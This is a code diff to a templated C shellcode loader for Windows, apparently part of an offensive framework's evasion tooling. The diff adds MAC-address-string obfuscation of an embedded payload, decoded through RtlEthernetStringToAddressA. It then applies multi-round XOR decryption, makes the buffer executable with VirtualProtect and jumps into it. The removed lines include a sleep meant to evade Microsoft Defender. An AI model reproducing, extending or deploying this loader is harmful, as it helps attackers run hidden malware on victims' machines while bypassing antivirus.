@@ -1,9 +1,10 @@
 #include <Windows.h>
-#include <stdio.h>
 #define SCSIZE <%= encrypted_payload_length %>
+#define DECODED_LENGTH <%= encrypted_payload_length*6 %> + 200
 
-char bPayload[SCSIZE] = "<%= encrypted_payload %>";
+char * bPayload[] = { <%= encrypted_payload.to_s.gsub!(']', '').gsub!('[', '') %> };
 char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";
+char bDecodedPayload[DECODED_LENGTH];
 
 typedef union _LARGE_INTEGER {
     struct {
@@ -17,11 +18,41 @@ typedef union _LARGE_INTEGER {
     __int64 QuadPart;
     } LARGE_INTEGER, *PLARGE_INTEGER;
 
+
+typedef NTSTATUS(__stdcall* fnRtlEthernetStringToAddressA)(
+    PCSTR		S,
+    PCSTR* Terminator,
+    PVOID		Addr
+    );
+
 typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
 	BOOLEAN              Alertable,
 	PLARGE_INTEGER       DelayInterval
 );
 
+typedef NTSTATUS (__stdcall *fnNtProtectVirtualMemory)(
+  HANDLE               ProcessHandle,              
+  PVOID            *BaseAddress,               
+  PULONG           NumberOfBytesToProtect,     
+  ULONG                NewAccessProtection,      
+  PULONG              OldAccessProtection        
+);
+
+void DecodePayload()
+{
+    int lpBufSize = SCSIZE * 6;
+    PCSTR terminator = NULL;
+    PBYTE tmp = (PBYTE)(&bDecodedPayload);
+
+    //TODO: API hashing here pls
+    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlEthernetStringToAddressA");
+
+    for (int i = 0; i != SCSIZE ; i+=1) {
+        fncMacDeobfuscate(bPayload[i], &terminator, (LPCSTR)tmp);
+        tmp = tmp + 6;
+    }
+
+}
 
 int DelayExecution()
 {
@@ -31,8 +62,8 @@ int DelayExecution()
     __int64             Delay = NULL;
     NTSTATUS            STATUS = NULL;
 
-    // TODO: add API hashing
-    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
+    //TODO: API hashing here pls
+    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
     DWORD               _T0 = NULL, _T1 = NULL;
 
     // Converting from milliseconds to the 100-nanosecond - negative time interval
@@ -58,7 +89,7 @@ int DelayExecution()
 
 char GetKey(char control_byte)
 {
-	char hardcoded = bPayload[0];
+	char hardcoded = bDecodedPayload[0];
 	for (int i = 0; i <= 255; i++)
 	{
 		char res = i ^ hardcoded;
@@ -67,30 +98,29 @@ char GetKey(char control_byte)
 	}
         }
 
-        void DecryptPayload(char control_byte)
+void DecryptPayload(char control_byte)
+{
+        char key = GetKey(control_byte);
+        for (int i = 0; i < <%= payload_length %>; i++)
         {
-                char key = GetKey(control_byte);
-                for (int i = 0; i < SCSIZE; i++)
-                {
-                        bPayload[i] = bPayload[i] ^ key;
-                }
+                bDecodedPayload[i] = bDecodedPayload[i] ^ key;
         }
+}
 
 void main() {
 	DWORD dwOldProtect;
 	char* payload_fnc = NULL;
-        for(int i = 0; i < <%= encryption_rounds %>; i++)
-        {
-                DecryptPayload(bControlBytes[i]);
-        }
-        payload_fnc = bPayload + 1;
-        VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-        
-        //play dead for Microsoft Defender, because why not
-        if(DelayExecution()){
-        (*(void (*)()) payload_fnc)();
-        }
+    
+    DecodePayload();
 
-	return;
+    for(int i = 0; i < <%= encryption_rounds %>; i++)
+    {
+            DecryptPayload(bControlBytes[i]);
+    }
+    payload_fnc = bDecodedPayload + 1;
+    
+	VirtualProtect(bDecodedPayload, DECODED_LENGTH, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	    
+    (*(void (*)()) payload_fnc)();
 }
 
